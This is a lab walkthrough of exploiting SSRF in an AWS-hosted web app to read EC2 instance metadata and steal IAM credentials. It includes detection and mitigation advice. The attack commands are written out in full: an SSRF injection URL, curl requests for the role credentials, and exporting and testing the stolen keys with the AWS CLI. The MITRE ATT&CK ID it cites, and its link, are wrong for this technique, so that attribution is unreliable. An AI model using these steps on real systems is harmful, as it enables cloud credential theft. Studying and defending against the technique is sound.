# SSRF to AWS Metadata Credential Extraction

Purpose: Demonstrates how to use SSRF to access AWS EC2 instance metadata and extract IAM credentials. Matches lab flows from PwnedLabs and BTLO.

Server-Side Request Forgery (SSRF) is a web application vulnerability that allows an attacker to make arbitrary HTTP requests from a vulnerable server. In cloud environments like AWS, SSRF becomes highly dangerous when used to access the EC2 instance metadata service, which hosts IAM credentials, tokens, and instance information.

This walkthrough demonstrates how an attacker could exploit an SSRF vulnerability in a cloud-hosted web application to access AWS IAM credentials from the metadata API (169.254.169.254). This technique is widely used in real-world cloud breaches and is included in the MITRE ATT&CK framework under T1557.003: Cloud Instance Metadata API.

This lab was conducted in a controlled environment using a simulated SSRF vulnerability hosted in a cloud-based web application. Platform: PwnedLabs / BTLO (Blue Team Labs Online). Target: Web server hosted on AWS EC2 with a curl-based SSRF parameter. Vulnerability: url= parameter that fails to validate input properly. Attacker Access: External user can inject requests via browser or curl. Detection Scope: AWS CloudTrail, web server logs, metadata access attempt. The goal was to simulate an attacker exploiting this SSRF to retrieve IAM credentials from the metadata service, then abuse those credentials using the AWS CLI.

# SSRF injection example – this is a placeholder and will only work in the lab environment
curl 'http://vulnerable-app.local/api/fetch?url=http://169.254.169.254'

curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role

Expected output:
{
  "AccessKeyId": "...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}

export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws sts get-caller-identity

Cloud defenders can detect this behavior using: CloudTrail logs showing unexpected calls to metadata IP from internal apps. Web server logs containing 169.254.169.254 in user-supplied input. VPC Flow logs with outbound connections to the metadata IP. IAM usage logs showing a token suddenly used for unusual services.

Mitigation & Response: Require IMDSv2 (Instance Metadata Service v2) on all EC2 instances. Use strict input validation on all URL parameters. Enforce least privilege for IAM roles assigned to EC2. Log and alert on traffic to the metadata IP range: 169.254.169.254.

Tools Used: curl – For testing SSRF and extracting metadata. AWS CLI – To use the stolen credentials for identity verification. PwnedLabs / BTLO – Simulated cloud lab environment for SSRF testing. CloudTrail / VPC Logs – For detecting post-exploitation artifacts.

References:
https://attack.mitre.org/techniques/T1557/003/
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
https://infosecwriteups.com/ssrf-to-aws-credentials-extraction-a-practical-guide-4c1001f8e5d4
